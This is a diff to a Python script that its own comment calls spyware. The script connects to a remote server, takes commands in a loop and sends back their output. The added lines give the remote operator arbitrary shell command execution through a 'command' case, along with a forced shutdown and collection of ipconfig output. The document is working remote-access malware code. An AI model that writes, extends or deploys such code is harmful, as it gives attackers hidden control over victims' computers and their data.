@@ -10,7 +10,12 @@ class terminal:
         pass
     def run_command(self,command):
         command = command.split(" ")
-        result = subprocess.run(command, stdout=subprocess.PIPE).stdout.decode()
+        print("executing commmand:",command)
+        try:
+            result = subprocess.run(command, stdout=subprocess.PIPE).stdout.decode()
+        except Exception as problem:
+            result = str(problem)
+            print(result)
         return result
 class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
     def __init__(self) -> None:
@@ -40,8 +45,7 @@ class remote_connection: #hopefully this class should provide neatly packaged fu
                 receive_buffer.append(recv.decode())
             self.server.sendall(b"_")
             self.server.recv(1024)
-            send_buffer = str(buffer)
-            for i in send_buffer:
+            for i in buffer:
                 self.server.sendall(i.encode())
                 self.server.recv(1024)
             self.server.sendall(b"&end")
@@ -57,20 +61,26 @@ outgoing_buffer = []
 while True:
     try:
         new_incoming_buffer = socket_handler.handshake(outgoing_buffer)
+        outgoing_buffer = []
         for i in new_incoming_buffer:
             incoming_buffer.append(i)
-        print("buffer:",incoming_buffer)
         counter = 0
         for i in incoming_buffer:
             del(incoming_buffer)[counter]
-            match i:
+            match i.split(",")[0]:
                 case "shutdown":
                     print("shutting down")
+                    terminal.run_command("shutdown /f")
                 case "ip address":
                     print("getting ip address")
                     for i in terminal.run_command("ipconfig").split("\n"):
-                        print("sending",i)
                         outgoing_buffer.append(i)
+                case "command":
+                    command = i.split(",")[1]
+                    for i in terminal.run_command(command).split("\n"):
+                        outgoing_buffer.append(i)
+            if outgoing_buffer[-1] == "":
+                del(outgoing_buffer)[-1]
             counter += 1        
     except Exception as problem:
         print(problem)
